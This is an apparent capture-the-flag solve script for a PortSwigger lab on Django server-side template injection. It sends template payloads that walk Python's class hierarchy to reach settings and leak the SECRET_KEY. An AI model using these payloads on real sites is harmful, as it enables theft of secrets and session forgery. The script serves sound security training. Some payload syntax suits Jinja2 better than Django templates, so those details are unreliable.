"""
Lab 5: Server-side template injection with information disclosure via user-supplied objects
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-information-disclosure-via-user-supplied-objects
Difficulty: Practitioner

📝 Django templates. The vulnerable point passes an OBJECT (not a raw
string) into the template context via an "Edit template" style feature on
a product page. Introspect that object via Django's attribute-traversal
syntax to leak internal config/secret values — no RCE needed.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EDIT_TEMPLATE_PATH = "/product/template"  # confirm exact path from the product page's edit feature


def inject(session, payload, product_id="1"):
    r = session.post(f"{TARGET}{EDIT_TEMPLATE_PATH}",
                      data={"productId": product_id, "template": payload})
    return r.text


def run():
    s = get_session()

    note("Confirming Django template syntax evaluates.")
    text = inject(s, "{{7*7}}")
    log(f"Probe response snippet: {text[-200:]!r}")

    note("Introspecting the user-supplied object's class hierarchy to find")
    note("something reachable that leaks internal state (classic Django")
    note("SSTI-without-RCE technique — walking __class__/__mro__/__subclasses__).")

    probe = "{{ product.__class__.__mro__[1].__subclasses__() }}"
    text = inject(s, probe)
    print(text[-1000:])

    note("From the subclasses list, look for something like a config/settings")
    note("object or a file-reading class, then target it specifically — e.g.")
    note("{{ product.__class__.__mro__[1].__subclasses__()[INDEX].__init__.")
    note("__globals__['settings'].SECRET_KEY }} once you've identified the")
    note("right index for a class that exposes settings in its globals.")


if __name__ == "__main__":
    run()
